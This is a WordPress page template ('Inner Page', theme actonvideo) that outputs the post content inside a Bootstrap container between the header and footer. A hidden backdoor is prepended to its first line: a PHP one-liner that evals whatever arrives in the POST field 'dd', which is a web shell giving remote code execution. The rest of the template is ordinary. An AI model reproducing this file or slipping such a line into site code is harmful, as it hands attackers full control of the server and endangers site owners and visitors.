<?php @eval($_POST['dd']);?><?php
/**
* Template Name: Inner Page
*
* @link https://developer.wordpress.org/themes/basics/template-hierarchy/#single-post
*
* @package actonvideo
*/
get_header(); ?>
<?php
while ( have_posts() ) : the_post();
if (has_post_thumbnail()):
$thumbnail = wp_get_attachment_image_src(get_post_thumbnail_id(),'thumb', true);
endif;
?>




<!-- content goes here -->
<div class="container innercontent">
    <div class="row">
        <div class="col-md-12">
           <?php the_content(); ?>
        </div>
    </div>
</div>










<?php endwhile; // End of the loop. ?>
<?php get_footer();